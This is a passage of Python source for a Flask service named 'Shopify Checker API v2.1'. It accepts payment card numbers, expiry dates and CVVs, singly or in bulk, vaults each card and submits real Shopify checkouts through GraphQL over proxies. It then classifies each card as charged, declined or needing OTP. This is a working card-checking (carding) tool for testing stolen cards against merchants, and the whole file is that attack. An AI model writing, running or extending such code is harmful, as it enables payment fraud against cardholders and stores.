                    pid  = (pm.get("paymentMethodIdentifier") or pm.get("id") or "").strip()
                    gw_n = (pm.get("extensibilityDisplayName") or pm.get("displayName") or
                            pm.get("name") or pid).strip()
                    if pid:
                        payment_id = pid
                        gateway    = gw_n
                        break

            if not payment_id:
                payment_id = "shopify_payments"
                gateway    = "Shopify Payments"

            price = str(round(float(running_total) + ship + tax, 2))

            # ── delivery proposal ──────────────────────────────────────
            dv = proposal_vars["delivery"]["deliveryLines"][0]
            dv["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle": {"handle": d_stg, "customDeliveryRate": False},
                "options": {}}
            dv["targetMerchandiseLines"] = {"lines": [{"stableId": stable_id}]}
            dv["expectedTotalPrice"]     = {"value": {"amount": str(ship), "currencyCode": currency}}
            dv["destinationChanged"]     = False
            proposal_vars["payment"]["billingAddress"] = {
                "streetAddress": {**addr_payload, "address2": ""}}
            proposal_vars["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax)
            proposal_vars["buyerIdentity"]["shopPayOptInPhone"]["number"] = addr["phone"]

            body2 = {"query": QUERY_PROPOSAL_DELIVERY, "operationName": "Proposal",
                     "variables": proposal_vars}
            t2, _ = await _gql(session, gql_url, gql_p, hdrs, body2, proxy)
            if is_captcha(t2 or ""):
                return False, "CAPTCHA_REQUIRED_delivery", gateway, price, currency

            if t2:
                r2, _ = safe_parse(t2, "proposal_delivery")
                if r2:
                    sp2 = _safe_get(r2, "data", "session", "negotiate", "result", "sellerProposal")
                    if isinstance(sp2, dict):
                        pay2 = sp2.get("payment", {})
                        if isinstance(pay2, dict) and pay2.get("__typename") == "FilledPaymentTerms":
                            for ln_ in (pay2.get("availablePaymentLines") or []):
                                pm = ln_.get("paymentMethod", {})
                                pid = (pm.get("paymentMethodIdentifier") or "").strip()
                                if pid and pid != "shopify_payments":
                                    payment_id = pid
                                    gateway    = (pm.get("extensibilityDisplayName") or
                                                  pm.get("name") or pid).strip()
                                    break

            # ── vault card (FIXED) ─────────────────────────────────────
            token, vault_err = await _vault_card(
                session, cc, mes, ano, cvv, fn, ln, ourl,
                ident_sig, ua, proxy, debug,
            )
            if not token:
                return False, vault_err or "vault_failed", gateway, price, currency

            # ── submit ─────────────────────────────────────────────────
            street_addr = {
                "address1": addr["address1"], "address2": "",
                "city": addr["city"], "countryCode": cc_,
                "postalCode": addr["postalCode"], "firstName": fn,
                "lastName": ln, "zoneCode": addr["zoneCode"], "phone": addr["phone"],
            }

            submit_vars = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {"deliveryLines": [{
                        "destination": {"streetAddress": street_addr},
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {"handle": d_stg, "customDeliveryRate": False},
                            "options": {"phone": addr["phone"]}},
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"value": {"amount": str(ship), "currencyCode": currency}},
                        "destinationChanged": False,
                    }],
                        "noDeliveryRequired": [], "useProgressiveRates": True,
                        "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True},
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                        "lineComponentsSource": None, "lineComponents": []}]},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {"directPaymentMethod": {
                                "paymentMethodIdentifier": payment_id,
                                "sessionId": token,
                                "billingAddress": {"streetAddress": street_addr},
                                "cardSource": None}},
                            "amount": {"value": {"amount": running_total, "currencyCode": currency}},
                            "dueAt": None}],
                        "billingAddress": {"streetAddress": street_addr}},
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": cc_},
                        "email": email, "emailChanged": False, "phoneCountryCode": cc_,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": addr["phone"], "countryCode": cc_},
                        "rememberMe": False},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": str(tax), "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url},
            }
            if checkpoint_data:
                submit_vars["input"]["checkpointData"] = checkpoint_data

            sub_body = {"query": MUTATION_SUBMIT, "variables": submit_vars,
                        "operationName": "SubmitForCompletion"}
            sub_p    = {"operationName": "SubmitForCompletion"}

            st, se = await _gql(session, gql_url, sub_p, hdrs, sub_body, proxy)
            if is_captcha(st or ""):
                return False, "CAPTCHA_REQUIRED_submit", gateway, price, currency
            if st and "Your order total has changed." in st:
                return False, "site_not_supported_total_changed", gateway, price, currency
            if st and "The requested payment method is not available." in st:
                return False, "payment_method_unavailable", gateway, price, currency

            sj, se2 = safe_parse(st, "submit")
            if se2:
                return False, se2, gateway, price, currency

            if sj.get("errors"):
                for e in sj["errors"]:
                    code = e.get("code") or e.get("message")
                    if code:
                        return False, extract_clean(str(code)), gateway, price, currency
                return False, "submit_gql_error", gateway, price, currency

            sd   = _safe_get(sj, "data", "submitForCompletion", default={})
            rtyp = sd.get("__typename", "") if isinstance(sd, dict) else ""
            rid  = None

            if rtyp in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                rec = sd.get("receipt", {})
                if isinstance(rec, dict):
                    if rec.get("__typename") == "ProcessedReceipt":
                        return True, "ORDER_PLACED", gateway, price, currency
                    rid = rec.get("id")
                if not rid:
                    return False, "success_no_receipt_id", gateway, price, currency
            elif rtyp == "SubmitFailed":
                return False, extract_clean(str(sd.get("reason", "unknown"))), gateway, price, currency
            elif rtyp == "SubmitRejected":
                errs = sd.get("errors") or []
                for e in errs:
                    if not isinstance(e, dict):
                        continue
                    code = e.get("code", "")
                    det  = e.get("localizedMessage", "") or e.get("nonLocalizedMessage", "")
                    if det and code in ("GENERIC_ERROR", "PAYMENT_FAILED", ""):
                        return False, det, gateway, price, currency
                    if code:
                        return False, code, gateway, price, currency
                return False, "submit_rejected", gateway, price, currency
            elif rtyp == "Throttled":
                return False, "throttled_submit", gateway, price, currency
            else:
                rec = sd.get("receipt") if isinstance(sd, dict) else None
                rid = rec.get("id") if isinstance(rec, dict) else None
                if not rid:
                    return False, f"unknown_submit: {rtyp}", gateway, price, currency

            # ── poll ───────────────────────────────────────────────────
            poll_body = {"query": QUERY_POLL, "operationName": "PollForReceipt",
                         "variables": {"receiptId": rid, "sessionToken": sst}}
            poll_p    = {"operationName": "PollForReceipt"}

            await asyncio.sleep(POLL_INITIAL)

            pt = None
            for _ in range(POLL_MAX):
                pt, _ = await _gql(session, gql_url, poll_p, hdrs, poll_body, proxy)
                if is_captcha(pt or ""):
                    return True, "CARD_DECLINED", gateway, price, currency

                pj, pe = safe_parse(pt, "poll")
                if pj:
                    rec = _safe_get(pj, "data", "receipt", default={})
                    if isinstance(rec, dict) and rec:
                        tn = rec.get("__typename", "")
                        if tn == "ProcessedReceipt":
                            return True, "ORDER_PLACED", gateway, price, currency
                        if tn == "FailedReceipt":
                            err = rec.get("processingError", {})
                            if isinstance(err, dict) and err.get("__typename") == "PaymentFailed":
                                code = err.get("code", "")
                                msg  = err.get("messageUntranslated", "")
                                return True, (msg if msg and code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") else code or "PAYMENT_FAILED"), gateway, price, currency
                            code = (err.get("code") if isinstance(err, dict) else None) or "UNKNOWN_ERROR"
                            return True, code, gateway, price, currency
                        if tn == "ActionRequiredReceipt":
                            return True, "OTP_REQUIRED", gateway, price, currency
                        if tn in ("ProcessingReceipt", "WaitingReceipt"):
                            await asyncio.sleep(POLL_INTERVAL)
                            continue
                else:
                    low = (pt or "").lower()
                    if "processedreceipt" in low:
                        return True, "ORDER_PLACED", gateway, price, currency
                    if "failedreceipt" in low or "declined" in low:
                        code = _eb(pt or "", '{"code":"', '"')
                        return True, code or "CARD_DECLINED", gateway, price, currency
                    if "actionrequiredreceipt" in low:
                        return True, "OTP_REQUIRED", gateway, price, currency
                    if "waitingreceipt" in low or "processingreceipt" in low:
                        await asyncio.sleep(POLL_INTERVAL)
                        continue
                break

            if pt:
                fj, _ = safe_parse(pt, "poll_final")
                if fj:
                    rc = _safe_get(fj, "data", "receipt", "processingError", "code")
                    if "shopify_payments" in str(fj):
                        return True, "ORDER_PLACED", gateway, price, currency
                    if rc:
                        return True, rc, gateway, price, currency
                    return True, "MISMATCHED_BILL", gateway, price, currency
                low = pt.lower()
                if "actionreq" in low:
                    return True, "OTP_REQUIRED", gateway, price, currency
                if "processedreceipt" in low:
                    return True, "ORDER_PLACED", gateway, price, currency
                if "failedreceipt" in low or "declined" in low:
                    return True, _eb(pt, '{"code":"', '"') or "CARD_DECLINED", gateway, price, currency

            return False, "WaitingReceipt_timeout_change_proxy", gateway, price, currency

    except Exception as e:
        logger.error(traceback.format_exc())
        return False, f"exception: {str(e)[:120]}", gateway, price, currency


async def _process_card_bounded(cc, mes, ano, cvv, site, variant_id, proxy_str, debug=False):
    try:
        return await asyncio.wait_for(
            process_card_inner(cc, mes, ano, cvv, site, variant_id, proxy_str, debug),
            timeout=HARD_TIMEOUT,
        )
    except asyncio.TimeoutError:
        return False, "hard_timeout", "UNKNOWN", "0.00", "USD"
    except Exception as e:
        return False, f"bounded_exception: {str(e)[:100]}", "UNKNOWN", "0.00", "USD"


def _run_card(cc, mes, ano, cvv, site, variant_id, proxy_str, debug=False):
    return asyncio.run(_process_card_bounded(cc, mes, ano, cvv, site, variant_id, proxy_str, debug))


def parse_cc(raw):
    parts = [p.strip() for p in raw.strip().split("|")]
    if len(parts) != 4:
        raise ValueError("Use CC|MM|YYYY|CVV")
    return parts[0], parts[1], parts[2], parts[3]


class GateRejected(Exception):
    pass


def _acquire():
    global _active_tasks, _queued_tasks
    with _task_lock:
        if _queued_tasks >= QUEUE_CAPACITY:
            raise GateRejected(f"queue full ({_queued_tasks}/{QUEUE_CAPACITY})")
        _queued_tasks += 1
        _active_tasks += 1


def _release():
    global _active_tasks, _queued_tasks
    with _task_lock:
        _active_tasks = max(0, _active_tasks - 1)
        _queued_tasks = max(0, _queued_tasks - 1)


app = Flask(__name__)


@app.route("/shopify", methods=["GET", "POST"])
def shopify_check():
    p = request.get_json(silent=True) or (request.form.to_dict() if request.method == "POST"
                                          else request.args.to_dict())

    site_raw  = (p.get("site") or "").strip()
    cc_raw    = (p.get("cc") or "").strip()
    proxy_str = (p.get("proxy") or "").strip() or None
    variant   = (p.get("variant") or "").strip() or None
    debug     = (p.get("debug") or "").lower() in ("1", "true", "yes")

    if not site_raw:
        return jsonify({"error": "Missing 'site'", "status": False}), 400
    if not cc_raw:
        return jsonify({"error": "Missing 'cc' (CC|MM|YYYY|CVV)", "status": False}), 400

    try:
        cc, mes, ano, cvv = parse_cc(cc_raw)
    except ValueError as e:
        return jsonify({"error": str(e), "status": False}), 400

    site = site_raw.replace("https://", "").replace("http://", "").rstrip("/")

    try:
        _acquire()
    except GateRejected as e:
        return jsonify({"error": f"Server busy — {e}", "status": False, "retry": True}), 503

    t0 = time.time()
    try:
        future = _executor.submit(_run_card, cc, mes, ano, cvv, site, variant, proxy_str, debug)
        success, message, gw, price, curr = future.result(timeout=HARD_TIMEOUT + 10)
    except Exception as e:
        return jsonify({
            "error": str(e)[:120], "status": False,
            "Gateway": "UNKNOWN", "Price": 0.0,
            "Response": f"crash: {str(e)[:120]}", "cc": cc_raw,
        }), 500
    finally:
        _release()

    elapsed = round(time.time() - t0, 2)
    clean   = extract_clean(message)

    try:
        price_f = float(price)
    except Exception:
        price_f = 0.0

    return jsonify({
        "Gateway":  gw,
        "Price":    price_f,
        "Response": clean,
        "Status":   success,
        "cc":       cc_raw,
        "time":     elapsed,
    })


@app.route("/shopify_bulk", methods=["POST"])
def shopify_bulk():
    data  = request.get_json(silent=True) or {}
    cards = data.get("cards") or []
    site  = (data.get("site") or "").strip().replace("https://", "").replace("http://", "").rstrip("/")
    proxy = (data.get("proxy") or "").strip() or None

    if not cards or not site:
        return jsonify({"error": "Missing 'cards' list or 'site'"}), 400
    if len(cards) > 50:
        return jsonify({"error": "Max 50 cards per bulk request"}), 400

    try:
        _acquire()
    except GateRejected as e:
        return jsonify({"error": f"Server busy — {e}", "retry": True}), 503

    try:
        futures = {}
        results = [None] * len(cards)

        for i, raw in enumerate(cards):
            try:
                cc, mes, ano, cvv = parse_cc(raw)
            except ValueError:
                results[i] = {"cc": raw, "error": "bad_format", "Status": False}
                continue
            fut = _executor.submit(_run_card, cc, mes, ano, cvv, site, None, proxy, False)
            futures[fut] = (i, raw)

        done, pending = wait(futures.keys(), timeout=HARD_TIMEOUT + 20)

        for fut in done:
            i, raw = futures[fut]
            try:
                success, message, gw, price, curr = fut.result(timeout=0)
                results[i] = {
                    "cc": raw, "Gateway": gw, "Price": price,
                    "Response": extract_clean(message), "Status": success,
                }
            except Exception as e:
                results[i] = {"cc": raw, "error": str(e)[:80], "Status": False}

        for fut in pending:
            i, raw = futures[fut]
            fut.cancel()
            results[i] = {"cc": raw, "error": "timeout", "Status": False}
        for fut in pending:
            try:
                fut.result(timeout=0)
            except Exception:
                pass

        for i, r in enumerate(results):
            if r is None:
                results[i] = {"cc": cards[i], "error": "unknown", "Status": False}

        return jsonify({
            "results": results,
            "total":   len(cards),
            "done":    sum(1 for r in results if r and "error" not in r),
            "pending": len(pending),
        })
    finally:
        _release()


@app.route("/health", methods=["GET"])
def health():
    with _task_lock:
        active   = _active_tasks
        queued   = _queued_tasks
        capacity = QUEUE_CAPACITY
        workers  = MAX_WORKERS
    return jsonify({
        "ok":          True,
        "workers":     workers,
        "active":      active,
        "queued":      queued,
        "queue_cap":   capacity,
        "available":   workers - active,
        "time":        time.strftime("%Y-%m-%d %H:%M:%S"),
    })


@app.route("/", methods=["GET"])
def root():
    return jsonify({
        "name": "Shopify Checker API v2.1",
        "endpoints": {
            "check":  "GET/POST /shopify?cc=CC|MM|YYYY|CVV&site=example.com[&proxy=...][&debug=1]",
            "bulk":   "POST /shopify_bulk {cards:[...], site:..., proxy:...}",
            "health": "GET /health",
        },
        "workers": MAX_WORKERS,
        "queue_capacity": QUEUE_CAPACITY,
        "hard_timeout": HARD_TIMEOUT,
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
